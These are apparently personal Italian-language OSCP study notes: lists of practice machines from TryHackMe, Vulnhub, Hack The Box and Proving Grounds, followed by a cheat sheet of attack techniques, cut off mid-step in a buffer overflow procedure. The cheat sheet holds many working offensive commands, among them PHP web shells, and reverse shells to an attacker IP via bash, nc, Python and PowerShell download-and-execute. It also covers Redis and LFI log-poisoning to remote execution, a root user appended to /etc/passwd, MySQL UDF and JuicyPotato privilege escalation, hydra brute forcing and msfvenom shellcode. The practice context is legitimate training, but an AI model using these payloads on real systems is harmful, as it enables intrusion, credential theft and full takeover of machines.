
**SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO**
vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000 

E poi trovi la cartella /nmt/hgfs/shared


#### TryeHackMe - Offensive Path:
(Scadenza 3/05/2021)
- Advanced Exploitation
	- <s>Game Zone</s>
	- <s>Skynet</s> -- possibile articolo
	- <s>Daily Bugle</s>
	- <s>Overpass 2 - Hacked</s>
	- <s>Relevant</s>
	- <s>Internal</s> -- possibile articolo (Port Forwarding)

- Buffer Overflow Exploitation
	- Buffer Overflow Prep
	- <s>Brainstorm</s>
	- <s>Gatepeeker</s>
	- <s>Brainpan 1</s>

- Active Directory
	- <s>Active Directory Basics</s>
 	- Attacking Kerberos
 	- Attacktive Directory
 	- <s>Post-Exploitation Basics</s>

 - Extra Credits
 	- Hacking with Powershell
 	- Corp
 	- <s>Mr Robot CTF</s>
 	- <s>Retro</s>



#### Vulnhub:
Beginner friendly
   - <s>Kioptrix: Level 1</s>
   - <s>Kioptrix: Level 1.1</s>
   - <s>Kioptrix: Level 1.2</s>
   - <s>Kioptrix: Level 1.3</s>
   - <s>FristiLeaks 1.3</s>
   - <s>Stapler 1</s>
   - <s>PwnLab: Init</s>
Intermediate
   - <s>Kioptrix: 2014</s>
   - <s>Brainpan: 1</s>
   - <s>Mr-Robot: 1</s>
   - <s>HackLAB: Vulnix</s>


   - VulnOS 2
   - SickOS 1.2
   - /dev/random:scream
   - pWnOS 2.0
   - SkyTower 1
   - IMF
   - Metasploitable 3
   - Lin. Security
   - Temple of Doom
   - Pinkys Palace v1
   - Pinkys Palace v2
   - Zico2
   - Wintermute
   - Lord of root 1.0.1
   - Tr0ll 1
   - Tr0ll 2
   - Web Developer 1
   - SoliState
 
   - OSCP (https://www.vulnhub.com/entry/infosec-prep-oscp,508/)
 

https://zayotic.com/posts/oscp-like-vulnhub-vms/


https://www.offensive-security.com/labs/individual/

#### Proving Grounds:
Windows
   - Nickel
   - <s>Slort</s>
   - Authby
   - Jacko
   - MeatHead
   - UT99
   - MedJed
   - <s>Algernon</s> (magari rifare)
   - Billyboss

Linux
   - <s>ClamAV</s>
   - <s>Wombo</s>
   - <s>Payday</s>
   - Fail
   - Nibbles
   - Banzai
   - Hunit
   - Dibble
   - Zino
   - Hetemit
Other
   - Bratarina
   - Internal
   - Clyde
   - Vector
   - Shifty



#### Hack The Box:
- Linux
	- Lame
	- brainfuck
	- shocker
	- bashed
	- nibbles
	- beep
	- _cronos_
	- nineveh
	- _sense_
	- solidstate
	- kotarak
	- node
	- valentine
	- poison
	- sunday
	- tartarsauce

- Windows
	- legacy
	- Blue
	- Devel
	- Optimum
	- Bastard
	- granny
	- Artic
	- grandpa
	- silo
	- bounty
	- jerry

- Other
	- _Jeeves (Windows)_
	- Bart (Windows)
	- Tally (WIndows)
	- Active (Windows)
	- Jail (Linux)
	- falafel (Linux)
	- Devops (Linux)
	- Hawk (Linux)



Exam Prep
Your Practice Environment:
Buffer Overflow Machine (25 Points)
Jeeves (25 Points)
Chatterbox (20 Points)
Cronos (20 Points)
Sense (10 Points)





#### Macchine HTB/Vulnhub/Proving Grounds:
	https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159



#### Articoli da Leggere:
https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
https://www.exploit-db.com/papers/42556
https://hacktips.it/guida-privilege-escalation-sistemi-windows/
https://hacktips.it/guida-privilege-escalation-sistemi-linux/

Windows Task Scheduled

Librotto

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Reverse shell explain:
https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/


Github resources:
https://github.com/ferreirasc/oscp




SMB
Buffer Overflow
Privilege Escalation
	Windows
	Linux

Windows Task Scheduled

Port Forwarding
SSH Tunneling



Grep


Privilege Escalation:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Windows Kernel Exploit:
https://github.com/SecWiki/windows-kernel-exploits/

WordPress exploit plugin:
https://dl.packetstormsecurity.net/papers/attack/exploiting-uploads.pdf


WinPEAS:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe



### URL Encode-Decode
https://www.url-encode-decode.com/


### Armageddon - HTB
mysql -u drupaluser -pPASSWORD -e 'show databases;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'show tables;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select * from users;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select name,pass from users;'

mysql -u john -phiroshima -e 'SHOW VARIABLES LIKE "%version%";'



python windows-exploit-suggester.py --database <xls database  of exploits provided with the script> --systeminfor <systeminfo saved in a txt file> --ostext <Os> -l


TryHackMe - Retro (altro privilege escalation molto interessante):
https://muirlandoracle.co.uk/2020/01/06/retro-write-up/


### Hydra
└─$ Wordpress
```hydra -l elliot -P fsocity.dic 192.168.1.192 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.192%2Fwp-admin%2F&testcookie=1:F=is incorrect'```

└─$ Ssh
(In questo caso sto facendo bruteforce sul nome dell'utente)
```
hydra -L users.txt -p "plbkac" 192.168.1.14 -t 4 ssh
```



### Download - Linux
Se non c'è nè wget nè curl:
https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et

```
/usr/bin/printf 'GET /26368.c \n' | nc 192.168.1.125 80 > exp.c
```


### Apache
FreeBSD
	/usr/local/etc/apache22/httpd.conf


### Altri file di log:
/var/log/sendmail.st.0
/root/.history
/var/log/httpd-access.log
/var/log/httpd-error.log
/usr/local/ossec-hids/logs/alerts/alerts.log
/var/log/messages
/var/log/lpd-errs
/var/log/auth.log
/var/log/maillog
/var/log/security
/var/log/userlog
/var/log/xferlog
/var/log/cron
/var/log/sendmail.st
/var/log/utx.lastlogin
/var/log/utx.log
/var/log/ppp.log
/var/log/debug.log



### Reverse shell php:
<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>

<?php system($_GET['cmd']); ?>

### Php + Powershell (Windows):
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.8.80.159/nc.exe','nc.exe'); cmd /c nc.exe 10.8.80.159 4444 -e cmd.exe\" }"); ?>



### Spawn an interactive shell 
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import pty; pty.spawn("cmd.exe")'

### Nikto
nikto -h $IP


### Redis
$ redis-cli -h 10.10.239.36 -p 6379

Per fare una reverse shell:
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


10.10.239.36:6379> config set dir /var/www/html
OK
10.10.239.36:6379> config set dbfilename shell.php
OK
10.10.239.36:6379> set test "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>"
OK
10.10.239.36:6379> save
OK


In questo caso, essendoci un server apache sulla 80 ho potuto accederci tramite:
https://10.10.239.36/shell.php


##### Redis 4.x/5.x RCE
Con MSF: linux/redis/redis_replication_cmd_exec

Con exploit GITHUB: https://github.com/vulhub/redis-rogue-getshell

Già scaricato in **~/Programs** ed eseguire:

```
sudo python3 redis-master.py -r 192.168.199.69 -p 6379 -L 192.168.49.199 -P 6379 -f RedisModulesSDK/exp.so -c "/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.199\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```


### Netdiscover:
netdiscover -i eth0



### Samba / smbclient:

Per vedere i workgroup:
└─$ nmblookup -A 192.168.1.104
Looking up status of 192.168.1.104
	KIOPTRIX        <00> -         B <ACTIVE> 
	KIOPTRIX        <03> -         B <ACTIVE> 
	KIOPTRIX        <20> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
	MYGROUP         <00> - <GROUP> B <ACTIVE> 
	MYGROUP         <1d> -         B <ACTIVE> 
	MYGROUP         <1e> - <GROUP> B <ACTIVE> 

	MAC Address = 00-00-00-00-00-00




Se dovesse uscire l'errore:

protocol negotiation failed: NT_STATUS_IO_TIMEOUT


Bisogna settargli la versione minima del protocollo aggiungendo:
--option='client min protocol = NT1'
oppure 
modificare il file **/etc/samba/smb.conf** aggiungendo nella sezione "[global]" "client min protocol = NT1" e riavviare samba con il comando ```sudo service smbd restart```


Per vedere invece la versione, si può sniffare il traffico e poi eseguire smbclient e il pacchetto con Info "Session Setup AndX Response" ci dà la versione, per esempio "Samba 2.2.1a"
Ci sarebbe anche lo script smb-ver.sh ma non è molto affidabile (pare)


Enumerazione NetBIOS usando nmap:

```
$ nmap -sC --script=smb-enum-users $IP

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:37 CST
Nmap scan report for 192.168.1.14
Host is up (0.00096s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:8B:97:53 (VMware)

Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account


Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```


Escaping Restricted Linux Shells
https://www.sans.org/blog/escaping-restricted-linux-shells/
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

```
john:~$ echo os.system('/bin/bash')
```

### MySQL

Se trovi un mysql con accesso di root, puoi sfruttare la vuln nota MySQL UDF
In questo link https://www.exploit-db.com/exploits/46249 MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit

Prima devi vedere se MySQL sta eseguendo con privilegi di root:

$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so


Poi puoi sfruttare la vuln: (In questo caso si danno i privilegi di admin all'utente john) https://lifesfun101.github.io/2019/09/05/kioptrix-1.3-walkthrough.html
```
john@Kioptrix4:/var/www$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 105
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.08 sec)
```


Con questa vuln, si potrebbe anche pensare di fare uno compilato per settare i suid di root:
```
john@Kioptrix4:~$ cd /tmp
john@Kioptrix4:/tmp$ cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
john@Kioptrix4:/tmp$ gcc -o setuid setuid.c
The program 'gcc' can be found in the following packages:
* gcc
* pentium-builder
Ask your administrator to install one of them
bash: gcc: command not found

root@kali:~# cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
root@kali:~# gcc -o setuid setuid.c -m32
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
172.16.119.135 - - [15/May/2015 08:28:52] "GET /setuid HTTP/1.0" 200 -

john@Kioptrix4:/tmp$ rm setuid.c
john@Kioptrix4:/tmp$ wget http://172.16.119.128:8000/setuid
--10:28:54--  http://172.16.119.128:8000/setuid
           => `setuid'
Connecting to 172.16.119.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5,072 (5.0K) [application/octet-stream]

100%[====================================>] 5,072         --.--K/s            

10:28:54 (711.75 MB/s) - `setuid' saved [5072/5072]

john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2015-05-15 10:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-r--r--  1 john john 5072 2015-05-15 08:28 setuid
drwxr-xr-x  2 root root 4096 2015-05-15 08:35 .winbindd

john@Kioptrix4:/tmp$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid');
+-----------------------------------------------------------------+
| sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid') |
+-----------------------------------------------------------------+
| NULL                                                            |
+-----------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
john@Kioptrix4:/tmp$ ./setuid
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
```


**you can inject php shell here**
```
$ mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Trovato da un writeup (esegue reverse shell, utilizzando mknod inserendolo nel parametro cmd del file .php che ha caricato prima)
Browsing to the file, as with part 4, I did not get any feedback from running commands such as /phpmyadmin_shell.php?cmd=whoami however I was able to obtain a reverse shell connection using mknod:
```
mknod /tmp/backpipe p; nc 192.168.110.129 8444 0/tmp/backpipe
```


### LFI
https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/

https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough

```
// Burp -> target -> site map -> http://192.168.0.4 -> checklogin.php -> Right click: myusername=user&mypassword=password -> Send to repeater
// Burp -> repeater -> 2 -> go                                          # Content-Length: 109. HTTP/1.1:200. (AKA Response doesn't have no phpsessid)
// Burp -> repeater -> 2 -> params -> mypassword: ' or 1=1-- - ->  go   # Content-Length: 429. HTTP/1.1:302. (AKA Response: cookie has a phpsessid value)
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:cec3a2499fb7067f170ccfaca1fb7980
// Burp -> repeater -> 2 -> follow redirect -> follow redirect -> params -> url -> username: index.php -> go
// Burp -> repeater -> 2 -> params -> url -> username: index.php%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /proc/self/cmdline%00 -> go
// Burp -> (toolbar) repeater -> action -> sent to: intruder
// Burp -> intruder -> position -> clear § -> GET /member.php?username=/proc/self/fd/§id%00§ HTTP/1.1
// Burp -> intruder -> payload -> numbers -> from: 0 -> to: 10 -> Step: 1
// Burp -> (toolbar) intruder -> start attack
// Burp -> response  # 9
// Burp -> repeater -> 2 -> < -> < -> < -> < -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- - <?php phpinfo(); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:9d64e60834f145250acc4ad08ca3eabc -> go -> follow redirct -> follow redirct
// Firefox -> http://192.168.0.4/member.php?username=/proc/self/fd/9%00
// Burp -> repeater -> 2 -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- <?php echo "\n\n"; passthru($_GET['cmd']); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:a513efb8691a7f125a6c80af573eae25 -> go -> follow redirct -> follow redirct
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=id"
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=whereis%20netcat"

nc -lvvp 443

curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=/bin/nc.traditional%20192.168.0.192%20443%20-e%20/bin/sh"
```

Spettacolo, praticamente usa il parametro username per leggere il contenuto di /etc/proc/fd/9 in cui viene loggato quello che inserisce l'utente al login. Quindi utilizza i log per fare una reverse shell





### Tips & Trick
- Al post del comando "ls" si può usare "echo \*" per listare il contenuto di una cartella

- echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

- Invertire un file ```tac fsocity.dic > fsocity.dic.reverse```


### Upload 
- Windows

powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.199/accesschk.exe' -OutFile 'accesschk.exe'"




### Worpress

Let's scan workpress
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate u
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate p
$ wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap

#### wordpress advanced video

searchsploit wordpress advanced video

$ cat /usr/share/exploitdb/platforms/php/webapps/39646.py

edit the script to the wordpress ip and folder 
then execute 

then go to https://192.168.190.131:12380/blogblog/wp-content/uploads/
and download the image 520019578.jpeg



#### Change Shell 
then i changed the shell 

```
$ sudo usermod -s /bin/bash peter
$ sudo -i
```

Man **usermod**:
-s, --shell SHELL
    The name of the user's new login shell. Setting this field to blank causes the system to select the default login shell. 

Man **sudo**:
-i [command]
The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. If no command is specified, an interactive shell is executed. sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use. 





### SSL error (script python, per https)

Upon downloading the exploit, and running it, I was presented with an SSL error… So I went ahead and edited the code to include the following

```
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

vedi anche: https://github.com/gtech/39646/blob/master/39646.py



### Recursive cat
find -name ".bash_history" -exec cat {} \;


### Linux Kernel 4.4.x (Ubuntu 16.04) – double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit (http://www.mrb3n.com/?p=81)

This particular kernel version appeared to be vulnerable to the following kernel exploit: https://www.exploit-db.com/exploits/39772/



### Windows Exploits (alcuni)

https://github.com/WindowsExploits/Exploits


### Certutil (Windows - per download)

certutil -urlcache -split -f "http://$IP/$FILE" $NOME_FILE


### JuicyPotato
Spiegazione presa da (https://www.youtube.com/watch?v=gz3_qRL0JJo)

Vedi anche: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/releases

Prima si mette in ascolto la mia macchina (nc -lnvp 443), poi si fa l'upload di JuicyPotato.exe e di shell.bat sulla macchina vittima e poi si esegue sulla macchina vittima:
```
JuicyPotato.exe -l 443 -p shell.bat -t *
```

In shell.bat:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://$IP/shell.ps1'))"
```

In shell.ps1: (è una reverse shell, presa da https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)


Oppure si può uploadare nc.exe e scrivere semplicemente in shell.ps1:
```
nc.exe -e cmd.exe $IP $PORT
``` 

Volendo, se si volesse eseguire una command line (senza un file shell.bat), si può fare:
```
JuicyPotato.exe -l 443 -p C:\Windows\system32\cmd.exe -t *
```

Se dovesse dare errore, potrebbe ssere perchp si deve settare il CLSID (si prende dal link di JuicyPotato (con tutte le parentesi graffe), in base alla versione del sistema) e poi si setta:

L'errore è **COM -> recv failed with error: 10038**

```
JuicyPotato.exe -l 443 -p shell.bat -t * -c  "$CLSID"
```

C'è anche uno script powershell per trovare il CLSID https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
In questo link https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505 viene usato ma solo la prima parte!


- Per questa vuln esiste anche PrintSpoofer https://github.com/itm4n/PrintSpoofer


#### Esempio

Sulla mia macchina mi metto nel path **~/Programs/JuicyPotato** e avvio server python (così posso uploadare i file che mi servono sulla macchina vittima)
```
┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo python -m SimpleHTTPServer 80
```

Poi avvio anche un listener (che mi servirà quando eseguo JuicyPotato):
```
nc -lnvp 4444
```

N.B. 
	- Nello script **shell.bat** bisogna modificare IP e PORT che devono essere quelli del server python
	- Nello script **shell.ps1** nell'ultima riga bisogna modificare IP e PORT perchè è questo che crea la reverse shell

shell.ps1 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/JuicyPotato.exe" jp.exe

****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.bat" shell.bat
****  Online  ****
  0000  ...
  0065
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.ps1" shell.ps1
****  Online  ****
  0000  ...
  1128
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            
-a---          6/2/2021   3:28 PM     347648 jp.exe                            
-a---          6/2/2021   3:29 PM        101 shell.bat                         
-a---          6/2/2021   3:29 PM       4392 shell.ps1                         


PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -> recv failed with error: 10038
PS C:\Users\bruce> systeminfo

Host Name:                 ALFRED
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          bruce
Registered Organization:   
Product ID:                00426-OEM-9154295-64842
Original Install Date:     10/25/2019, 9:51:08 PM
System Boot Time:          6/2/2021, 3:22:00 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,184 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,107 MB
Virtual Memory: In Use:    988 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.107.63
                                 [02]: fe80::29a7:2281:ed40:a2b9

PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t * -c "{555F3418-D99E-4E51-800A-6E89CFD8B1D7}"
Testing {555F3418-D99E-4E51-800A-6E89CFD8B1D7} 4444
......
[+] authresult 0
{555F3418-D99E-4E51-800A-6E89CFD8B1D7};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```



Se voglio eseguire lo script per trovare i CLSID, ho una versione semplificata rispetto a quella che si trova sul github di JuicyPotato
Il file si trova in **~/Programs/JuicyPotato/getCLSID_semplificato.ps1**

Dalla macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/getCLSID_semplificato.ps1" getCLSID.ps1
****  Online  ****
  0000  ...
  011c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> .\getCLSID.ps1

WARNING: column "CurrentLocation" does not fit into the display and was removed
.

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
{00021401-0000-0000-C000-000000000046}
{000C101C-0000-0000-C000-000000000046}
{0010890e-8789-413c-adbc-48f5b511b3af}
{00393519-3A67-4507-A2B8-85146167ACA7}
{00597829-82CE-44d4-8B0B-40BE695973B5}
{00BC7EAE-28D5-4310-BE9F-11526A7FA37F}
{00f2b433-44e4-4d88-b2b0-2698a0a91dba}
{010911E2-F61C-479B-B08C-43E6D1299EFE}
{0289a7c5-91bf-4547-81ae-fec91a89dec5}
{031EE060-67BC-460d-8847-E4A7C5E45A27}
{0365BE92-BD3F-47f5-8BB6-2EEF7AF5CAE7}
{03837511-098B-11D8-9414-505054503030}

[...]
```


Per questo script, ho avuto un errore:
```
PS C:\Users\bruce> .\getCLSID.ps1
****  Online  ****
  0000  ...
  062c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> Invoke-PowerShellTcp : File C:\Users\bruce\getCLSID.ps1 cannot be loaded becaus
e the execution of scripts is disabled on this system. Please see "get-help abo
ut_signing" for more details.
At line:1 char:119
+ iex (New-Object Net.WebClient).DownloadString('http://10.8.80.159:8000/Invoke
-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.8.80.159
 -Port 5555
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
```

Ho risolto eseguendo il comando ```Set-ExecutionPolicy RemoteSigned``` da **ADMIN** (ovviamente dopo aver eseguito JuicyPotato, ma era per testare lo script). Quindi se dovesse dare questo errore, serve essere admin.


### PrintSpoofer
Per vulnerabilità di SeImpersonatePrivileges

https://github.com/itm4n/PrintSpoofer


### SQLi

https://book.hacktricks.xyz/pentesting-web/sql-injection


###BoF

##### Windows
1. Cambiare IP e PORT in fuzzer.py
2. Eseguire fuzzer.py per trovare il numero di bytes per far crashare l'applicativo

3. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l #bytes_trovati_al_punto_2 + 500

4. Resettare in exploit.py i valori di: (Cambiare anche IP e PORT)
- buffer_size = 0
- offset = 0
- overflow = "A" * offset
- retn = ""
- nop_size = 0
- padding = "" * nop_size
- payload = ""

5. Inserire il valore trovato al punto 2 in **buffer_size** e la stringa generata al punto 3 in **payload**

6. Nella macchina Windows avviare Immunity Debugger con l'applicativo ed eseguire:
- !mona config -set workingfolder c:\mona\%p

7. Eseguire exploit.py

8. Andare nella macchina Windows e l'applicativo ha crashato, eseguire:
- !mona findmsp -distance #bytes_trovati_al_punto_2 + 500

Questo ci darà il valore dell'offset. **N.B prendere offset scritto nella riga dell'EIP**

9. Sostituire il valore dell'offset trovato al punto 8, in exploit.py alla variabile **offset** (LOL, ovviamente xD)

10. Inserire "BBBB" in exploit.py nella variabile **retn** (commentare la riga di codice ```buffer += struct.pack('<I', retn)``` e inserire ```buffer += retn``` altrimenti dà errore)
Questo per testare che effettivamente viene inserito "BBBB" nel return address con l'offset che abbiamo inserito.

11. Trovare i bad character
12. Creare un array di byte su immunity debugger ```!mona bytearray -b "\x00"```
13. Exeguire generate_bad_chars.py e copiare il payload in exploit.py ed eseguirlo

14. Andare su immunity debugger ed eseguire ```!mona compare -f C:\mona\oscp\bytearray.bin -a addr_esp``` (attenta al path) e sostituire l'indirizzo dell'esp 
15. Se ci sono bad characters rifare il giro dal punto 12 aggiungendo i caratteri

16. Una volta trovati i bad characters ```!mona jmp -r esp -cpb "\x00\x08\x2c\xad"``` (sostituire nelle virgolette, i bad characters trovati prima)
17. Prendere uno degli indirizzi che escono dal punto 16 e inserirlo in exploit.py in retn (esattamente così 0x311712f3) (rimettere la riga di codice ```buffer += struct.pack('<I', retn)```)

18. Generare shellcode ```msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.159 LPORT=5555 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py -v payload``` (dipende che sistema si ha)

19. Inserire il payload in exploit.py in questo formato:
